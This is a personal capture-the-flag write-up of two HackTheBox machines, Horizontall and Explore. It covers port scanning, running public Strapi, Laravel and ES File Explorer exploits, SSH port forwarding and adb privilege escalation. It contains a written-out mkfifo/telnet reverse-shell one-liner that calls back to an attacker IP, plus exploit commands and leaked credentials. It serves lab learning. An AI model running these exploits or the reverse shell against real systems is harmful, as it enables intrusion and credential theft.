---
layout: default
---

#### **Write Up : HackTheBox, TryHackMe, VulnHub**
#### [Retour](../index.md)

### **Horizontall :**
#### Port Scanning
nmap -sC -sV -p- horizontall.htb > nmap_scan.txt
```
22/tcp open  ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5  protocol 2.0
80/tcp open  http nginx 1.14.0 (Ubuntu)
	|_http-server-header: nginx/1.14.0 (Ubuntu)
	|_http-title: horizontall
```

Note : _Vue.js_

---
#### DNS Enumeration
gobuster : 
gobuster vhost -u http://horizontall.htb/ -w subdomains-top1million-110000.txt -t 256
- Result : api-prod.horizontall.htb
---

#### Files Enumeration
gobuster dir -u http://api-prod.horizontall.htb/ -w directory-list-2.3-medium.txt -t 256
- /admin               (Status: 200) [Size: 854]
- /users                (Status: 403) [Size: 60]
- /reviews            (Status: 200) [Size: 507]
- /Reviews           (Status: 200) [Size: 507]
- /Users               (Status: 403) [Size: 60]
- /Admin              (Status: 200) [Size: 854]
- /REVIEWS         (Status: 200) [Size: 507]

Note : _STRAPI CMS_

----
3 Users who can be find on /users

```
[{"id":1,"name":"wail","description":"This is good service","stars":4,"created_at":"2021-05-29T13:23:38.000Z","updated_at":"2021-05-29T13:23:38.000Z"},

{"id":2,"name":"doe","description":"i'm satisfied with the product","stars":5,"created_at":"2021-05-29T13:24:17.000Z","updated_at":"2021-05-29T13:24:17.000Z"},

{"id":3,"name":"john","description":"create service with minimum price i hop i can buy more in the futur","stars":5,"created_at":"2021-05-29T13:25:26.000Z","updated_at":"2021-05-29T13:25:26.000Z"}]
```
___
#### Srapi CVE : [ExploitDB-link](https://www.exploit-db.com/exploits/50239)
#### Command : ``sudo python3 50239.py http://api-prod.horizontall.htb``
- Strapi CMS Version running : Remote Code Execution (RCE)
```
[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM1NDQwMDE3LCJleHAiOjE2MzgwMzIwMTd9.rzPc8u0nF9KwvXlrgt2wVEp__0WzaMU5u2QupmZ42kE
```

#### Get the first shell : 
Step 1 : Use netcat who listening on 4444

Step 2 : On the blind shell we can use a basic shell : [Example of Shells](https://book.hacktricks.xyz/shells/shells/linux).

user : strapi (CMS)

I use this one : 
-	```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 10.10.16.86 4444 >/tmp/f```
#### Get user flag
Note : connected as strapi user 
cd /home/developer : user.txt

#### netcat command to check open port (looking for port forwarding)
- ``sudo netstat -tunap``

Return of netcat command:
	```tcp        0      0 127.0.0.1:8000          0.0.0.0:*```         

Remote Port Forwarding :

LOCAL command ssh 
``ssh -i id_rsa -L 8050:127.0.0.1:8000 strapi@horizontall.htb``
_-N Do not execute a remote command.  This is useful for just forwarding ports._

And open another local terminal and get root with exploit :  [CVE-2021-2019](https://github.com/nth347/CVE-2021-3129_exploit)

``sudo python3 exploit.py http://127.0.0.1:8050 Monolog/RCE1 "cat /root/root.txt"``

[Orther write up](https://www.youtube.com/watch?v=nQvWXUIve58)


___

### **Explore :**
#### Port Scanning
```
2222/tcp  open     ssh     (protocol 2.0)
5555/tcp  filtered freeciv
36331/tcp open     unknown
42135/tcp open     http    ES File Explorer Name Response httpd
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
```


#### CVE Search
ES File Explorer Name Response httpd : CVE-2019-6447

`searchsploit ES File Explorer`

Command with the exploit : 50070.py

``python3 50070.py listFiles explore.htb``
- Return the files on the HTB

``python3 50070.py listPics explore.htb``
-	Take attention to : creds.jpg

``python3 ESFileExploIt.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg``
- Download the creds.jpg  and open it : (username & password)


#### SSH Connexion
``ssh kristi@10.10.10.247 -p 2222``

#### User flag
- /sdcard

#### Privilege Escalation
#### SSH Port Forwarding
-	Note : Not need to specify port
``ssh -p 2222 -L 1234:127.0.0.1:5555 kristi@10.10.10.247``

On orther terminal we can start connexion with :
- ``adb connect localhost:1234``
- ``adb shell``
In the shell as (shell user) we can do a simple : 
- ``su root``

/data => root.txt

[Adb Documentation](https://adbshell.com/commands/adb-root)